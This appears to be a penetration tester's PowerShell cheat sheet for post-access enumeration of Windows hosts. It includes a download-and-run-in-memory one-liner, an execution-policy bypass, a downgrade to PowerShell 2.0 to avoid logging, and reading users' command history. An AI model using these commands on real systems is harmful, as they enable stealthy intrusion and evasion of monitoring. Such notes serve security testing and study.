-- -
#### Basic Enum
```powershell
# list available modules loaded for user.
Get-Module

# Lists execution policy settings enforced on session
Get-ExecutionPolicy -List

# Change execution policy for the current session i.e. settings will revert on a new session/shell. More specifically changes the execution policy to bypass.
Set-Execution Bypass  -Scope Process

# Specified User's PowerShell command history i.e. equivalent to history in the terminal.
Get-Content C:\Users\<username>\AppData\Roaming\Windows\Powershell\PSReadline\ConsoleHost_history.txt

# Return environment variables 
Get-ChildItem Env: | ft Key,Value
```

^70bbe9

#### Download file over HTTP
```powershell
# Download a file from the web and call it from memory
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"
```

^5e02c8

#### Downgrade PowerShell Version
```powershell
# Logging was introduced in PowerShell 3.0, so if we can use PowerShell 2.0, then our actions won't be logged in Event Viewer, affording us more stealth.
powershell.exe -version 2
```

^5ccc63

#### Enum Defenses
```powershell
# Enum filewall settings
netsh advfirewall show allprofiles

# Check if Windows Defender is running
sc query windefend

# Check Windows Defender Config
Get-MpComputerStatus
```

^092be7

#### Enum Logged in Users
```powershell
qwinsta
```

^3fad5e


#### Network Enum
```pwoershell
# List all known hosts stored in the ARP table
arp -a

# List adapter settings. See if it's a part of multiple network segments/subnets
ipconfig /all 

# List routing table. Identify known networks and layer 3 routes
route print

# Status of the host's firewall
netsh advfirewall show state
```

^fb9888
